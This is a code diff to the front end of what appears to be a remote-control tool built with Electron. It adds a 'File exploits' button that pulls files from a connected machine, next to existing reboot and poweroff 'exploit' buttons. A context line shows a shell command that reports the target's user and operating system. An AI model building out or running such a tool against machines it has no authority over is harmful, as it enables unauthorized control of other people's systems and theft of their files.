@@ -30,8 +30,19 @@ const processIndex = document.getElementById('processIndex');
 const utilsIndex = document.getElementById('utilsIndex');
 const scriptsIndex = document.getElementById('scriptsIndex');
 
+/**
+ * System exploits
+ */
 const rebootButton = document.getElementById('rebootButton');
 const poweroffButton = document.getElementById('poweroffButton');
+
+/**
+ * File exploits
+ */
+const getfileButton = document.getElementById('getfileButton');
+
+const sourceInput = document.getElementById('sourceInput').value
+const destinationInput = document.getElementById('destinationInput').value
 
 const hostInput = document.getElementById("host-input");
 const portInput = document.getElementById("port-input");
@@ -84,7 +95,7 @@ function showExploit(page) {
   utilsIndex.classList.remove("active");
   scriptsIndex.classList.remove("active");
 
-  if(page == 'system') {
+  if (page == 'system') {
     systemIndex.classList.add("active");
   }
   else if (page === 'files') {
@@ -141,13 +152,18 @@ echo -e "lb{0x0001}ù$(whoami)ù$(hostnamectl | grep "Operating" | cut -d ':' -f
 
 }
 
+/**
+ * Exploits
+ */
 rebootButton.addEventListener('click', () => {
   window.electron.sendMessage('lb{0x0002}');
 })
 poweroffButton.addEventListener('click', () => {
   window.electron.sendMessage('lb{0x0003}');
 })
-
+getfileButton.addEventListener('click', () => {
+  window.electron.requestFileTransfer(sourceInput, destinationInput);
+})
 
 window.electron.onConnectionStatus((status) => {
   if (status === "connected") {
